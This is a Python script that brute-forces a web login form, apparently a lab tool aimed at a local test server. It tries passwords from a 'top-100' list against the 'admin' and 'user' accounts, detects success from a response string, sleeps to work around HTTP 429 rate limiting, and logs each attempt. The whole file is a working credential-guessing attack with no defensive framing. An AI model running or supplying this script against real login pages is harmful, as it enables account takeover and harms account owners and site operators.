import requests
import sys
import time
from datetime import datetime
from termcolor import colored


target = "http://127.0.0.1:5000"
usernames = ["admin", "user"]
password_file = "top-100.txt"
needle = "Login Successful"
log_file = "brute_attempts.log"
delay = 1 


def log_attempt(username, password, status):
    with open(log_file, "a") as log:
        timestamp = datetime.now().isoformat()
        log.write(f"[{timestamp}] {username}:{password} -> {status}\n")

for username in usernames:
    with open(password_file, "r") as f:
        for password in f:
            password = password.strip()
            attempt_msg = f"[>] Trying {username}:{password}"
            print(colored(attempt_msg, "cyan"), end="\r")

            try:
                r = requests.post(target, data={
                    "username": username,
                    "password": password
                }, timeout=10)

                if needle in r.text:
                    success_msg = f"[✔] SUCCESS: {username}:{password}"
                    print(colored(success_msg, "green"))
                    log_attempt(username, password, "SUCCESS")
                    sys.exit(0)
                elif r.status_code == 429:
                    warn_msg = f"[!] RATE LIMITED — sleeping 10s"
                    print(colored(warn_msg, "yellow"))
                    log_attempt(username, password, "RATE LIMITED")
                    time.sleep(10)
                else:
                    log_attempt(username, password, "FAIL")

            except requests.exceptions.RequestException as e:
                print(colored(f"[!] Request failed: {e}", "red"))
                log_attempt(username, password, "ERROR")

            time.sleep(delay)

print(colored("\n[✘] No valid credentials found.", "red"))
